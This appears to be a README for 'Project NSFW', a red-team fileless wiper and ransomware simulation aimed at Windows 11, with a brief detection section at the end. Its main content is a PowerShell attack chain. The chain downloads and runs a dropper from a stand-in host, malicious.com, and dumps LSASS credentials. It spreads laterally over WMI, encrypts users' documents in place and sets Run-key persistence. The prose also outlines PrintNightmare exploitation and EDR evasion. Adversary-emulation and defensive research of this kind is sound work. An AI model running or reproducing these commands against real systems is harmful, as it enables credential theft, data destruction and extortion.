## üîí Project NSFW: Net Sharing Fileless Wiperware

### Executive Summary

**Project NSFW** is a cutting-edge red/purple team research initiative that simulates a **fileless and polymorphic malware** framework, purpose-built for **Windows 11** environments. This project highlights the real-world feasibility of advanced cyberattacks that operate solely in memory and weaponize native system binaries (LOLBins), leaving minimal forensic traces. Drawing inspiration from NotPetya-class threats, NSFW demonstrates how adversaries can exploit Windows **print spooler services** for stealthy lateral movement and privilege escalation. The framework is designed not only to emulate sophisticated adversary actions, but also to support defender education in modern detection and mitigation strategies.

This repository enables simulation of a realistic adversary kill chain using MITRE ATT&CK techniques, emphasizing complete fileless operation and stealth.

## üîì Fileless Ransomware Lab Example (LOLBins in Action)

> **Warning:** This is a synthetic simulation for red team research.  
> **Never run outside of an isolated test lab.**

```powershell
# Initial Access (T1190) - Load dropper via web
IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")

# Execution (T1059.001) - Decode & load payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation (T1548)
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access (T1003.001)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement (T1021.001)
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption (T1486)
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence (T1547.001)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```

### üß† Core Concepts

#### **Net Sharing (Initial Access & Wormability)**

* Leverages Windows print and file sharing through `net.exe`, `net use`, and other LOLBins.
* Automates exploitation of **PrintNightmare** and **HiveNightmare** vulnerabilities (`CVE-2021-34527`, `CVE-2021-36934`) for privilege escalation and worm-like propagation.
* Supports both Metasploit-driven attacks (`exploit/windows/printnightmare`) and custom PowerShell/WMI remote execution.

#### **Fileless Execution (Stealth & Evasion)**

* Executes all payloads directly in memory using trusted system binaries:
  * `rundll32.exe`, `regsvr32.exe`, `mshta.exe`, `cmdkey.exe`, `wmic.exe`
* Minimizes disk writes to thwart forensic analysis and evade AV/EDR detection.
* Delivers shellcode through phishing attachments such as `.jpg`, `.lnk`, or `.ps1` files.

#### **Wiper Logic (Final Stage Payload)**

* Emulates ransomware behavior but with a focus on **destruction rather than extortion**.
* Employs **DiskCryptor-based encryption**.
* Can optionally print ransom notes via Windows printer services for realism.

### üß© Attack Flow Overview

1. **Initial Access** ‚Äì Spear phishing with embedded `.jpg` or `.lnk` files.
2. **Exploit** ‚Äì Abuse of Print Spooler or Registry CVEs for escalation.
3. **Lateral Movement** ‚Äì Network spreading via `net use`, WMI, or PowerShell remoting.
4. **Persistence** ‚Äì Scheduled tasks or registry keys using LOLBins for stealth.
5. **Payload Execution** ‚Äì In-memory DLL or shellcode injection (Donut/sRDI).
6. **Impact** ‚Äì NTFS metadata destruction, ransom notes deployment, and system disruption.

### üéØ Objectives

| Red Team (Adversary Simulation)         | Blue Team (Defender Insight)                 |
| --------------------------------------- | -------------------------------------------- |
| Demonstrate AV/EDR evasion with LOLBins | Tune threat hunting based on ATT&CK mapping  |
| Trigger controlled system failure       | Apply Sigma/Sysmon for real-time monitoring  |

### üîç Detection & Mitigation Strategy

* Aligned with MITRE ATT&CK tactics:
  * `T1055` (Process Injection), `T1562` (Defense Evasion), `T1021` (Remote Services)
* Recommended detection sources:
  * **Sysmon**, **ELK**, **Splunk**, **Sigma Rules**
* Monitoring tips:
  * Watch for Print Spooler restarts, `rundll32`/`regsvr32` anomalies
  * Track unexpected driver or service installations
  * Monitor memory entropy and suspicious in-memory code execution
